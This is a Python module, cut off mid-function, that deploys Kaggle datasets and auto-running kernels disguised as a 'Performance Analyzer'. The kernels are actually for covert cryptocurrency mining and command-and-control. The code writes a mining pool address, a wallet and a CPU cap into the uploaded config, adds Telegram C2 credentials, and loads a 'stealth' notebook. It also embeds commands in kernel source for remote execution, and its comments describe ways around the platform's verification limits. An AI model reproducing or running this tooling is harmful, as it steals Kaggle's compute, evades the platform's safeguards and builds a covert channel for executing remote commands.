"""Kaggle Dataset & Kernel utilities for C2 operations.

IMPORTANT: Kaggle API - C2 Channel Architecture
================================================================
PRIVATE KERNELS: ✓ WORKS via kernels/push + kernels/pull
C2 CHANNEL: ✓ Commands embedded in kernel source

Working via API:
- kaggle kernels push (isPrivate=True) → 200 OK
- kaggle kernels pull → 200 OK (read source with commands)
- kaggle kernels list → 200 OK
- kaggle kernels status → 200 OK

C2 Functions:
- update_c2_commands() → embed commands in kernel source
- get_c2_commands() → retrieve commands from kernel source

Architecture:
  Operator ──kernels/push──► Kernel (commands in source)
     ▲                         │
     └──────kernels/pull───────┘

See docs/KAGGLE_API_ANALYSIS.md for details
"""

import os
import time
import json
import requests
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Callable, List


KAGGLE_API = "https://www.kaggle.com/api/v1"


def create_dataset_and_kernel(
    username: str,
    api_key: str,
    kgat_token: str = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Create dataset and kernel for single account deployment.
    
    Simplified wrapper for auto-deploy: creates 1 dataset + 1 kernel.
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key (for dataset creation)
        kgat_token: Kaggle KGAT token with kernels.write permission (for kernel push)
        log_fn: Logging function
    
    Returns:
        dict with success, dataset_slug, kernel_slug
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "dataset_slug": None,
        "kernel_slug": None,
        "error": None,
    }
    
    try:
        # Setup Kaggle credentials
        kaggle_json = {"username": username, "key": api_key}
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[DEPLOY] ════════════════════════════════════════════════════════")
        log_fn(f"[DEPLOY] Starting deployment for: {username}")
        log_fn(f"[DEPLOY] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        log_fn(f"[DEPLOY] ════════════════════════════════════════════════════════")
        
        # Get C2 URL from config (project root)
        file_path = Path(__file__).resolve()
        project_root = file_path.parent.parent.parent  # src/agents/kaggle -> src -> project root
        config_path = project_root / "config.json"
        
        # Create dataset
        dataset_slug = f"{username}/perf-analyzer"
        
        dataset_meta = {
            "title": "Performance Analyzer",
            "id": dataset_slug,
            "subtitle": "CPU performance analysis",
            "description": "System performance analysis tools",
            "licenses": [{"name": "MIT"}],
        }
        
        # Get Telegram C2 config
        telegram_bot_token = None
        telegram_chat_id = None
        if os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    cfg = json.load(f)
                    telegram_bot_token = cfg.get("telegram_bot_token")
                    telegram_chat_id = cfg.get("telegram_chat_id")
            except: pass
        
        # Write config.json for dataset (Telegram C2 only - no tunnel needed)
        config_data = {
            "pool": "pool.hashvault.pro:80",
            "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
            "cpu_limit": 25,
            "updated": int(time.time())
        }
        # Add Telegram C2 config
        if telegram_bot_token and telegram_chat_id:
            config_data["telegram_bot_token"] = telegram_bot_token
            config_data["telegram_chat_id"] = telegram_chat_id
            log_fn(f"[DEPLOY] ✓ Telegram C2 configured: chat_id={telegram_chat_id}")
        else:
            log_fn(f"[DEPLOY] ⚠ No Telegram C2 config found")
        with open(project_root / "config.json", "w") as f:
            json.dump(config_data, f, indent=2)
        
        log_fn(f"[DEPLOY] Creating dataset: {dataset_slug}")
        
        # Write dataset-metadata.json to project root for Kaggle CLI
        dataset_meta_path = project_root / "dataset-metadata.json"
        with open(dataset_meta_path, "w") as f:
            json.dump(dataset_meta, f, indent=2)
        log_fn(f"[DEPLOY] Wrote dataset metadata to {dataset_meta_path}")
        
        # Push dataset
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        dataset_result = subprocess.run(
            [kaggle_cmd, "datasets", "create", "-p", str(project_root), "--dir-mode", "tar"],
            capture_output=True, text=True, timeout=120
        )
        
        if dataset_result.returncode == 0 or "already exists" in dataset_result.stderr.lower():
            result["dataset_slug"] = dataset_slug
            log_fn(f"[DEPLOY] ✓ Dataset: {dataset_slug}")
        else:
            # Try to update existing dataset
            update_result = subprocess.run(
                [kaggle_cmd, "datasets", "version", "-p", str(project_root), "--dir-mode", "tar", "-m", "Update"],
                capture_output=True, text=True, timeout=120
            )
            if update_result.returncode == 0 or dataset_result.returncode == 0:
                result["dataset_slug"] = dataset_slug
                log_fn(f"[DEPLOY] ✓ Dataset updated: {dataset_slug}")
            else:
                result["error"] = f"Dataset failed: {dataset_result.stderr[:100]}"
                return result
        
        # Create kernel
        kernel_slug = f"{username}/perf-analyzer"
        
        # Load notebook
        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
        with open(notebook_path, "r") as f:
            notebook = json.load(f)
        
        log_fn(f"[DEPLOY] Creating kernel: {kernel_slug}")
        
        # Use KGAT token for kernel push (has kernels.write permission)
        kernel_api_key = kgat_token if kgat_token else api_key
        if kgat_token:
            log_fn(f"[DEPLOY] Using KGAT token for kernel push")
        else:
            log_fn(f"[DEPLOY] Using Legacy API Key for kernel push (may fail without kernels.write)")
        
        # Push kernel
        push_result = push_kernel_json(
            username=username,
            api_key=kernel_api_key,
            notebook_content=json.dumps(notebook),
            kernel_slug=kernel_slug,
            title="Performance Analyzer",
            enable_internet=True,
            dataset_sources=[dataset_slug],
            log_fn=log_fn,
        )
        
        if push_result.get("success"):
            result["kernel_slug"] = kernel_slug
            result["success"] = True
            log_fn(f"[DEPLOY] ✓ Kernel: {kernel_slug}")
        else:
            result["error"] = push_result.get("error", "Kernel push failed")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[DEPLOY] ✗ Error: {e}")
    
    return result


def create_dataset_with_machines(
    api_key: str,
    username: str,
    num_machines: int = 5,
    log_fn: Optional[Callable] = None,
    enable_mining: bool = True,
) -> dict:
    """Create a dataset and kernels for autonomous mining.
    
    Creates:
    - Dataset with Telegram C2 config (no public URL needed)
    - Kernels with TelegramC2 for direct communication
    
    Args:
        api_key: Kaggle API key
        username: Kaggle username
        num_machines: Number of kernels to create
        log_fn: Logging function
        enable_mining: Enable autonomous mining mode
    
    Returns:
        dict with success status and created resources
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "dataset": None,
        "machines": [],
        "machines_created": 0,
        "error": None,
    }
    
    try:
        # Setup Kaggle API credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        log_fn(f"[KAGGLE] Credentials configured for {username}")
        
        # Import kaggle after credentials are set
        import subprocess
        
        # Clone GitHub repo and create dataset
        log_fn(f"[DATASET] Cloning GitHub repository...")
        dataset_slug = f"{username}/perf-analyzer"
        
        # Get current C2 URL from config or use default
        file_path = Path(__file__).resolve()
        # Config is in kaggle/config/config.json (same level as datasets.py)
        kaggle_dir = file_path.parent
        config_path = kaggle_dir / "config" / "config.json"
        
        kaggle_username = username  # Default to provided username
        kaggle_api_key = api_key    # Default to provided api_key
        
        # Get credentials from config.json (Telegram C2 works without public URL)
        if os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    cfg = json.load(f)
                    # Telegram C2 doesn't need c2_url - works directly via Telegram API
                    if cfg.get("kaggle_username"):
                        kaggle_username = cfg["kaggle_username"]
                    if cfg.get("kaggle_api_key"):
                        kaggle_api_key = cfg["kaggle_api_key"]
            except: pass
        
        # Get Telegram C2 config - ALWAYS try to preserve
        telegram_bot_token = None
        telegram_chat_id = None
        if os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    cfg = json.load(f)
                    telegram_bot_token = cfg.get("telegram_bot_token")
                    telegram_chat_id = cfg.get("telegram_chat_id")
                    log_fn(f"[CONFIG] Telegram C2: bot={telegram_bot_token[:10] if telegram_bot_token else 'NONE'}... chat={telegram_chat_id or 'NONE'}")
            except: pass
        
        # Use config credentials if available, otherwise use provided
        username = kaggle_username
        api_key = kaggle_api_key
        
        # Create config.json for dataset (Telegram C2 - no public URL needed)
        config_data = {
            "pool": "pool.hashvault.pro:80",
            "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
            "cpu_limit": 25,
            "updated": int(time.time())
        }
        # Add Telegram C2 config if available
        if telegram_bot_token and telegram_chat_id:
            config_data["telegram_bot_token"] = telegram_bot_token
            config_data["telegram_chat_id"] = telegram_chat_id
            log_fn(f"[DATASET] ✓ Telegram C2 configured: chat_id={telegram_chat_id}")
        else:
            log_fn(f"[DATASET] ⚠ No Telegram C2 config found")
        
        dataset_meta = {
            "title": "Performance Analyzer",
            "id": f"{username}/perf-analyzer",
            "subtitle": "CPU performance analysis and benchmarking",
            "description": "System performance analysis tools for CPU benchmarking",
            "licenses": [{"name": "MIT"}],
            "keywords": ["performance", "cpu", "benchmark", "analysis"],
            "collaborators": [],
            "data": [],
        }
        
        # Create dataset directory - use kaggle/config/ for config files
        # This directory will be uploaded to Kaggle
        kaggle_config_dir = kaggle_dir / "config"
        dataset_dir = kaggle_config_dir  # Upload config dir as dataset
        
        # Dataset files are already in project (src, setup.py, requirements.txt, README.md)
        log_fn(f"[DATASET] Using project files from: {dataset_dir}")
        
        # Write config.json to kaggle/config/ (will be uploaded to dataset)
        with open(kaggle_config_dir / "config.json", "w") as f:
            json.dump(config_data, f, indent=2)
        
        # Write dataset-metadata.json (required by Kaggle CLI)
        with open(kaggle_config_dir / "dataset-metadata.json", "w") as f:
            json.dump(dataset_meta, f, indent=2)
        
        log_fn(f"[DATASET] config.json written with Telegram C2")
        log_fn(f"[DATASET] config.json content: {json.dumps(config_data, indent=2)[:500]}")
        
        # Push dataset to Kaggle using kagglesdk (no metadata files needed)
        log_fn(f"[DATASET] Pushing dataset to Kaggle via API...")
        log_fn(f"[DATASET] Dir: {dataset_dir}")
        
        # List files in dataset dir
        files = os.listdir(dataset_dir)
        log_fn(f"[DATASET] Files: {files}")
        
        try:
            from kagglesdk import KaggleClient
            from kagglesdk.datasets.types.datasets_api_service import ApiCreateDatasetRequest, ApiCreateDatasetVersionRequestBody
            from kagglesdk.datasets.types.datasets_enums import DatasetStatus
            
            os.environ['KAGGLE_USERNAME'] = kaggle_username
            os.environ['KAGGLE_KEY'] = kaggle_api_key
            
            client = KaggleClient()
            
            # Read config.json content
            config_file = dataset_dir / "config.json"
            with open(config_file, 'rb') as f:
                config_content = f.read()
            
            # Create dataset request
            request = ApiCreateDatasetRequest()
            request.title = "Performance Analyzer"
            request.slug = "perf-analyzer"
            request.license_name = "MIT"
            request.is_private = False
            
            # Create version with file
            version_body = ApiCreateDatasetVersionRequestBody()
            version_body.files = [{
                "token": "config.json",
                "upload_file": config_content
            }]
            
            log_fn(f"[DATASET] Creating dataset via kagglesdk...")
            response = client.datasets.datasets_api_client.create_dataset(request)
            log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
            
        except Exception as e:
            log_fn(f"[DATASET] kagglesdk failed: {e}, trying CLI...")
            # Fallback to CLI with generated metadata
            kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
            if not os.path.exists(kaggle_cmd):
                kaggle_cmd = "kaggle"
            
            dataset_push_result = subprocess.run(
                [kaggle_cmd, "datasets", "create", "-p", dataset_dir, "--dir-mode", "tar"],
                capture_output=True,
                text=True,
                timeout=120,
            )
            
            log_fn(f"[DATASET] CLI stdout: {dataset_push_result.stdout[:200] if dataset_push_result.stdout else 'empty'}")
            log_fn(f"[DATASET] CLI code: {dataset_push_result.returncode}")
            
            if dataset_push_result.returncode == 0:
                log_fn(f"[DATASET] ✓ Created dataset: {dataset_slug}")
            else:
                log_fn(f"[DATASET] ⚠ Dataset push failed, trying version update...")
                dataset_push_result = subprocess.run(
                    [kaggle_cmd, "datasets", "version", "-p", dataset_dir, "-m", "Update", "--dir-mode", "tar"],
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
                if dataset_push_result.returncode == 0:
                    log_fn(f"[DATASET] ✓ Updated dataset: {dataset_slug}")
                else:
                    result["error"] = f"Dataset creation failed"
                    return result
        
        # Create single kernel
        log_fn("[KERNEL] Creating kernel...")
        
        kernel_slug = f"{username}/perf-analyzer"
        
        # Load notebook from file (stealth version)
        notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
        log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
        
        with open(notebook_path, "r") as f:
            notebook = json.load(f)
        
        # Push kernel via kagglesdk
        push_result = push_kernel_json(
            username=username,
            api_key=api_key,
            notebook_content=json.dumps(notebook),
            kernel_slug=kernel_slug,
            title="Performance Analyzer",
            enable_internet=True,
            dataset_sources=[dataset_slug],
            log_fn=log_fn,
        )
        
        if push_result.get("success"):
            log_fn(f"[KERNEL] ✓ Kernel created: {kernel_slug}")
            result["success"] = True
            result["kernel_slug"] = kernel_slug
        else:
            log_fn(f"[KERNEL] ✗ Kernel failed: {push_result.get('error')}")
            result["error"] = push_result.get("error")
        
        return result
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLE] ✗ Error: {e}")
    
    return result


def list_kernels(api_key: str, username: str) -> list:
    """List all kernels for a user."""
    try:
        import kaggle
        kaggle.api.authenticate()
        kernels = kaggle.api.kernels_list(user=username)
        return [{"slug": k.ref, "title": k.title, "status": k.status} for k in kernels]
    except:
        return []


def push_kernel(api_key: str, username: str, kernel_path: str) -> bool:
    """Push a kernel to Kaggle."""
    try:
        import subprocess
        result = subprocess.run(
            ["kaggle", "kernels", "push", "-p", kernel_path],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0
    except:
        return False


def push_kernel_json(
    username: str,
    api_key: str,
    notebook_content: str,
    kernel_slug: str,
    title: str,
    enable_gpu: bool = False,
    enable_internet: bool = True,
    is_private: bool = False,  # Changed to False - kernel must be public
    dataset_sources: list = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Push kernel to Kaggle via kagglesdk with SAVE_AND_RUN_ALL for auto-execution.
    
    Uses kagglesdk which supports kernel_execution_type=SAVE_AND_RUN_ALL
    to automatically run the kernel after push.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        notebook_content: Notebook JSON as string
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        title: Kernel title
        enable_gpu: Enable GPU (default False - GPU kernels don't auto-run)
        enable_internet: Enable internet
        is_private: Make kernel private
        log_fn: Logging function
    
    Returns:
        dict with success status and response
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "url": None, "error": None}
    
    try:
        log_fn(f"[KERNEL] ════════════════════════════════════════════════════════")
        log_fn(f"[KERNEL] Pushing kernel: {kernel_slug}")
        log_fn(f"[KERNEL] User: {username}, Title: {title}")
        log_fn(f"[KERNEL] ════════════════════════════════════════════════════════")
        
        # Use kagglesdk for kernel creation
        from kagglesdk import KaggleClient
        from kagglesdk.kernels.types.kernels_api_service import ApiSaveKernelRequest
        from kagglesdk.kernels.types.kernels_enums import KernelExecutionType
        
        # Set credentials - Legacy API Key for write operations
        # Note: KGAT token is read-only, Legacy Key has write permissions
        os.environ['KAGGLE_USERNAME'] = username
        os.environ['KAGGLE_KEY'] = api_key
        log_fn(f"[KERNEL] Using Legacy API Key for authentication")
        
        log_fn(f"[KERNEL] Initializing KaggleClient...")
        client = KaggleClient()
        
        # Create request
        log_fn(f"[KERNEL] Creating kernel request...")
        request = ApiSaveKernelRequest()
        request.slug = kernel_slug
        request.new_title = title
        request.text = notebook_content
        request.language = "python"
        request.kernel_type = "notebook"
        request.is_private = is_private
        request.enable_internet = True
        request.enable_gpu = enable_gpu if enable_gpu else False
        request.kernel_execution_type = KernelExecutionType.SAVE_AND_RUN_ALL
        
        # Add dataset sources (format: "username/dataset-slug")
        if dataset_sources:
            request.dataset_data_sources = dataset_sources
            log_fn(f"[KERNEL] Dataset sources: {dataset_sources}")
        
        log_fn(f"[KERNEL] Settings: internet=True, gpu={enable_gpu}")
        
        # Execute
        log_fn(f"[KERNEL] Calling save_kernel API...")
        try:
            response = client.kernels.kernels_api_client.save_kernel(request)
        except Exception as api_err:
            if "409" in str(api_err) or "Conflict" in str(api_err):
                log_fn(f"[KERNEL] Kernel exists, updating...")
                # Kernel exists - update it (remove new_title for update)
                request.new_title = None
                response = client.kernels.kernels_api_client.save_kernel(request)
            else:
                raise
        
        log_fn(f"[KERNEL] API response received, processing...")
        result["success"] = True
        result["url"] = response.url if hasattr(response, 'url') else f"https://www.kaggle.com/code/{kernel_slug}"
        log_fn(f"[KERNEL] ✓ SUCCESS! Kernel pushed with SAVE_AND_RUN_ALL")
        log_fn(f"[KERNEL]   URL: {result['url']}")
        log_fn(f"[KERNEL] ════════════════════════════════════════════════════════")
    
    except ImportError as e:
        log_fn(f"[KERNEL] ⚠ kagglesdk not available: {e}")
        log_fn("[KERNEL] Using fallback via Kaggle CLI...")
        
        # Fallback: Use Kaggle CLI to push kernel
        try:
            import tempfile
            from pathlib import Path
            
            # Load notebook from file (stealth version)
            notebook_path = os.path.join(os.path.dirname(__file__), "notebook-telegram.ipynb")
            log_fn(f"[KERNEL] Loading notebook from: {notebook_path}")
            
            with open(notebook_path, "r") as f:
                notebook_content = f.read()
            
            # Create temp directory
            with tempfile.TemporaryDirectory() as tmpdir:
                tmpdir_path = Path(tmpdir)
                
                # Write notebook
                (tmpdir_path / "notebook.ipynb").write_text(notebook_content)
                
                # Write kernel metadata
                metadata = {
                    "id": kernel_slug,
                    "title": title,
                    "code_file": "notebook.ipynb",
                    "language": "python",
                    "kernel_type": "notebook",
                    "is_private": is_private,
                    "enable_internet": enable_internet,
                    "enable_gpu": enable_gpu if enable_gpu else False,
                }
                if dataset_sources:
                    metadata["dataset_data_sources"] = dataset_sources
                (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
                
                # Push via Kaggle CLI
                kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
                if not os.path.exists(kaggle_cmd):
                    kaggle_cmd = "kaggle"
                
                push_result = subprocess.run(
                    [kaggle_cmd, "kernels", "push", "-p", tmpdir],
                    capture_output=True, text=True, timeout=60
                )
                
                if push_result.returncode == 0 or "successfully" in push_result.stdout.lower():
                    result["success"] = True
                    result["url"] = f"https://www.kaggle.com/code/{kernel_slug}"
                    log_fn(f"[KERNEL] ✓ Pushed via CLI (no auto-run): {kernel_slug}")
                else:
                    result["error"] = push_result.stderr[:200] if push_result.stderr else "Unknown error"
                    log_fn(f"[KERNEL] ✗ CLI push failed: {result['error']}")
        
        except Exception as fallback_error:
            result["error"] = str(fallback_error)
            log_fn(f"[KERNEL] ✗ Fallback error: {fallback_error}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Push error: {e}")
    
    return result


def get_kernel_output(
    username: str,
    api_key: str,
    kernel_slug: str,
    output_dir: str = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Download kernel output files from Kaggle.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        output_dir: Directory to save outputs (default: /tmp/kernel_output_{timestamp})
        log_fn: Logging function
    
    Returns:
        dict with success status, files list, and status.json content if found
    """
    if log_fn is None:
        log_fn = print
    
    result = {
        "success": False,
        "files": [],
        "status": None,
        "error": None,
    }
    
    try:
        import subprocess
        import tempfile
        
        # Create output directory
        if output_dir is None:
            output_dir = f"/tmp/kernel_output_{int(time.time())}"
        os.makedirs(output_dir, exist_ok=True)
        
        # Find kaggle CLI
        kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
        if not os.path.exists(kaggle_cmd):
            kaggle_cmd = "kaggle"
        
        # Set credentials
        kaggle_json = {
            "username": username,
            "key": api_key,
        }
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_path, "w") as f:
            json.dump(kaggle_json, f)
        os.chmod(kaggle_path, 0o600)
        
        # Download outputs
        download_result = subprocess.run(
            [kaggle_cmd, "kernels", "output", kernel_slug, "-p", output_dir],
            capture_output=True,
            text=True,
            timeout=60,
        )
        
        if download_result.returncode == 0:
            # List downloaded files
            files = os.listdir(output_dir)
            result["files"] = files
            result["success"] = True
            
            # Read status.json if exists
            status_path = os.path.join(output_dir, "status.json")
            if os.path.exists(status_path):
                with open(status_path) as f:
                    result["status"] = json.load(f)
                log_fn(f"[KERNEL] ✓ Got status from {kernel_slug}")
            
            log_fn(f"[KERNEL] ✓ Downloaded {len(files)} files from {kernel_slug}")
        else:
            result["error"] = download_result.stderr[:200] if download_result.stderr else "Unknown error"
            log_fn(f"[KERNEL] ✗ Failed to get output: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Error getting output: {e}")
    
    return result


def get_kernel_status(
    username: str,
    api_key: str,
    kernel_slug: str,
) -> dict:
    """Get kernel execution status via API.
    
    Args:
        username: Kaggle username
        api_key: Kaggle API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
    
    Returns:
        dict with status, lastRunTime, and other metadata
    """
    try:
        # Parse kernel slug
        if "/" in kernel_slug:
            user, slug = kernel_slug.split("/", 1)
        else:
            user = username
            slug = kernel_slug
        
        # Call kernels/pull API
        resp = requests.get(
            f"https://www.kaggle.com/api/v1/kernels/pull",
            params={"userName": user, "kernelSlug": slug},
            auth=(username, api_key),
            timeout=30,
        )
        
        if resp.status_code == 200:
            data = resp.json()
            metadata = data.get("metadata", {})
            return {
                "success": True,
                "status": metadata.get("status"),
                "lastRunTime": metadata.get("lastRunTime"),
                "commitId": metadata.get("commitId"),
                "ref": metadata.get("ref"),
            }
        else:
            return {"success": False, "error": f"HTTP {resp.status_code}"}
    
    except Exception as e:
        return {"success": False, "error": str(e)}


# ═══════════════════════════════════════════════════════════════════════════════
# KAGGLEHUB FUNCTIONS (Read operations only - write blocked since Sep 2024)
# ═══════════════════════════════════════════════════════════════════════════════

def kagglehub_whoami(
    username: str,
    api_key: str,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Check authentication via kagglehub.
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        log_fn: Logging function
    
    Returns:
        dict with success and user info
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "error": None}
    
    try:
        import kagglehub
        
        os.environ['KAGGLE_USERNAME'] = username
        os.environ['KAGGLE_KEY'] = api_key
        
        kagglehub.whoami()
        result["success"] = True
        log_fn(f"[KAGGLEHUB] ✓ Credentials validated for {username}")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLEHUB] ✗ Auth failed: {e}")
    
    return result


def kagglehub_download_output(
    username: str,
    api_key: str,
    kernel_slug: str,
    output_dir: Optional[str] = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Download kernel output via kagglehub.
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        output_dir: Output directory (default: kagglehub cache)
        log_fn: Logging function
    
    Returns:
        dict with success, output_path, and files
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "output_path": None, "files": [], "error": None}
    
    try:
        import kagglehub
        
        # Setup kaggle.json for kagglehub auth
        kaggle_dir = os.path.expanduser("~/.kaggle")
        os.makedirs(kaggle_dir, exist_ok=True)
        kaggle_json_path = os.path.join(kaggle_dir, "kaggle.json")
        with open(kaggle_json_path, "w") as f:
            json.dump({"username": username, "key": api_key}, f)
        os.chmod(kaggle_json_path, 0o600)
        
        # Also set env vars
        os.environ['KAGGLE_USERNAME'] = username
        os.environ['KAGGLE_KEY'] = api_key
        
        log_fn(f"[KAGGLEHUB] Downloading output from {kernel_slug}...")
        
        # Use kernel slug format
        if '/' not in kernel_slug:
            kernel_slug = f"{username}/{kernel_slug}"
        
        output_path = kagglehub.notebook_output_download(kernel_slug)
        result["output_path"] = output_path
        
        if output_path and os.path.exists(output_path):
            files = os.listdir(output_path)
            result["files"] = files
            result["success"] = True
            log_fn(f"[KAGGLEHUB] ✓ Downloaded {len(files)} files to {output_path}")
        else:
            result["error"] = "No output path returned"
            log_fn(f"[KAGGLEHUB] ⚠ No output available (kernel may still be running)")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KAGGLEHUB] ✗ Download failed: {e}")
    
    return result


def check_existing_kernel(
    username: str,
    api_key: str,
    kernel_slug: str,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Check if kernel exists and get its status.
    
    Uses kaggle CLI for read operations (still working).
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        log_fn: Logging function
    
    Returns:
        dict with exists, status, and metadata
    """
    if log_fn is None:
        log_fn = print
    
    result = {"exists": False, "status": None, "metadata": None, "error": None}
    
    try:
        import base64
        
        # Use direct API call
        auth_str = base64.b64encode(f"{username}:{api_key}".encode()).decode()
        
        # Parse kernel slug
        parts = kernel_slug.split('/')
        if len(parts) == 2:
            kernel_user, kernel_name = parts
        else:
            kernel_user = username
            kernel_name = kernel_slug
        
        # Get kernel metadata via pull API
        resp = requests.get(
            "https://www.kaggle.com/api/v1/kernels/pull",
            headers={"Authorization": f"Basic {auth_str}"},
            params={"userName": kernel_user, "kernelSlug": kernel_name},
            timeout=30
        )
        
        if resp.status_code == 200:
            data = resp.json()
            meta = data.get("metadata", {})
            result["exists"] = True
            result["status"] = meta.get("status", "unknown")
            result["metadata"] = meta
            log_fn(f"[KERNEL] ✓ {kernel_slug}: status={result['status']}")
        elif resp.status_code == 404:
            result["error"] = "Kernel not found"
            log_fn(f"[KERNEL] ⚠ {kernel_slug}: not found")
        else:
            result["error"] = f"HTTP {resp.status_code}"
            log_fn(f"[KERNEL] ⚠ Status check failed: {result['error']}")
        
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Error: {e}")
    
    return result


def push_kernel_via_api(
    username: str,
    api_key: str,
    kernel_slug: str,
    title: str,
    notebook_content: str,
    is_private: bool = True,
    enable_internet: bool = True,
    enable_gpu: bool = False,
    dataset_sources: List[str] = None,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Push kernel to Kaggle via REST API.
    
    NOTE: Only PRIVATE kernels work without phone verification.
    Public kernels (is_private=False) return 403.
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        title: Kernel title
        notebook_content: Base64-encoded notebook JSON
        is_private: Must be True (public requires phone verification)
        enable_internet: Enable internet access
        enable_gpu: Enable GPU
        dataset_sources: List of dataset sources (e.g., ['username/dataset'])
        log_fn: Logging function
    
    Returns:
        dict with success, url, version, error
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "url": None, "version": None, "error": None}
    
    try:
        import base64
        
        auth_str = base64.b64encode(f"{username}:{api_key}".encode()).decode()
        
        # Prepare request
        payload = {
            "slug": kernel_slug,
            "text": notebook_content,
            "language": "python",
            "kernelType": "notebook",
            "isPrivate": is_private,
            "enableInternet": enable_internet,
            "enableGpu": enable_gpu
        }
        
        # Only set title for new kernels
        if title:
            payload["newTitle"] = title
        
        if dataset_sources:
            payload["datasetDataSources"] = dataset_sources
        
        log_fn(f"[KERNEL] Pushing {kernel_slug} (private={is_private})...")
        
        resp = requests.post(
            "https://www.kaggle.com/api/v1/kernels/push",
            headers={
                "Authorization": f"Basic {auth_str}",
                "Content-Type": "application/json"
            },
            json=payload,
            timeout=60
        )
        
        if resp.status_code == 200:
            data = resp.json()
            result["success"] = True
            result["url"] = data.get("url", f"https://www.kaggle.com/code/{kernel_slug}")
            result["version"] = data.get("versionNumber", 1)
            log_fn(f"[KERNEL] ✓ Created: {result['url']} (v{result['version']})")
        elif resp.status_code == 403:
            error_msg = resp.json().get("message", "Phone verification required")
            result["error"] = f"403: {error_msg}"
            log_fn(f"[KERNEL] ✗ 403 Forbidden: {error_msg}")
        else:
            result["error"] = f"HTTP {resp.status_code}: {resp.text[:200]}"
            log_fn(f"[KERNEL] ✗ Error: {result['error']}")
    
    except Exception as e:
        result["error"] = str(e)
        log_fn(f"[KERNEL] ✗ Exception: {e}")
    
    return result


def update_c2_commands(
    username: str,
    api_key: str,
    kernel_slug: str,
    commands: dict,
    log_fn: Optional[Callable] = None,
) -> dict:
    """Update C2 commands in kernel source.
    
    Uses kernel source as C2 channel - bypasses output restrictions.
    Target reads commands via kernels/pull API.
    
    Args:
        username: Kaggle username
        api_key: Kaggle Legacy API key
        kernel_slug: Kernel slug (e.g., 'username/kernel-name')
        commands: Dict with C2 commands to embed
        log_fn: Logging function
    
    Returns:
        dict with success, version, error
    """
    if log_fn is None:
        log_fn = print
    
    result = {"success": False, "version": None, "error": None}
    
    try:
        import base64
        import json
        
        # Create notebook with embedded commands
        code_cells = [
            "# C2 CONFIG - EMBEDDED IN SOURCE",
            f"COMMANDS = {json.dumps(commands, indent=4)}",
            "",
            "# Target reads this via kernels/pull API",
            "# Commands are extracted and executed",
            "",
            "import os",
            "import json",
            "import time",
            "import urllib.request",
            "",
            "# Execute command",
            "action = COMMANDS.get('action', 'idle')",
